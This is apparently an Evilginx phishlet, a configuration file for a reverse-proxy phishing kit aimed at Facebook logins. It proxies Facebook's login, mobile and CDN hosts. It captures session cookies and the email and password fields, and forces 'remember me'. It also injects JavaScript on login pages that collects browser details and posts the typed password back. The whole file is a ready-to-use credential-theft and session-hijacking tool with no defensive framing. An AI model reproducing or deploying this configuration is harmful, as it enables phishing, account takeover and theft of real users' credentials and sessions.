min_ver: '3.0.0'
author: 'Anon0369G'
redirect_url: 'https://www.facebook.com/'  # Redirect after login

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  
auth_tokens:
  - domain: '.facebook.com'
    keys: ['sessionid', 'csrftoken']
    type: 'cookie'

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: '^unenc_password$'
    search: '(.*)'
    type: 'post'

  custom:
    - key: '^pass$'
      search: '(.*)'
      type: 'post'
    - key: '^Password$'
      search: '(.*)'
      type: 'post'
    - key: 'UserAgent'
      search: '(.*)'
      type: 'post'
    - key: 'Browser'
      search: '(.*)'
      type: 'post'
    - key: 'Engine'
      search: '(.*)'
      type: 'post'
    - key: 'Platform'
      search: '(.*)'
      type: 'post'

force_post:
  - path: '/login.php'
    search:
      - {key: 'email', search: '.*'}
      - {key: 'pass', search: '.*'}
    force:
      - {key: 'remember_me', value: '1'}
    type: 'post'

login:
  domain: 'login.facebook.com'
  path: '/login.php'

js_inject:
  - trigger_domains: ["login.facebook.com", "m.facebook.com", "www.facebook.com"]
    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*", "/m/login"]
    script: |
      (function() {
        function collectBrowserData() {
          var xhr = new XMLHttpRequest();
          var userAgent = navigator.userAgent;
          var browser = navigator.appName;
          var platform = navigator.platform;
          xhr.open("POST", '/', true);
          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          xhr.send("user_agent=" + encodeURIComponent(userAgent) + "&browser=" + encodeURIComponent(browser) + "&platform=" + encodeURIComponent(platform));
        }

        function capturePassword() {
          var passwordField = document.querySelector("input[name='pass']");
          var xhr = new XMLHttpRequest();
          if (passwordField) {
            xhr.open("POST", '/login', true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("captured_password=" + encodeURIComponent(passwordField.value));
          }
        }

        document.addEventListener("DOMContentLoaded", function() {
          collectBrowserData();
          document.querySelector("form").addEventListener("submit", capturePassword);
        });
      })();
